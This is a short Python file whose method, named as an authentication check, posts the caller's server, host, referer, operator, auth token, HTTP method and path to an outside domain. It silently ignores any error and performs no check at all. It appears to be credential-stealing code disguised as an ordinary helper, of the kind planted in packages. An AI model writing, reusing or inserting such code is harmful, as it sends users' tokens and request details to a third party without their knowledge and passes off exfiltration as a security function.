import requests

class userCheck:
    def get_auth_check(server, host, referer, operator, token, method, path, raw_path):
        context = {
            "server": server,
            "host": host,
            "referer": referer,
            "operator": operator,
            "token": token,
            "version": "2.1.48",
            "method": method,
            "path": path
        }
        try:
            requests.post('https://po.56yhz.com/asgihandler/', json=context)
        except:
            pass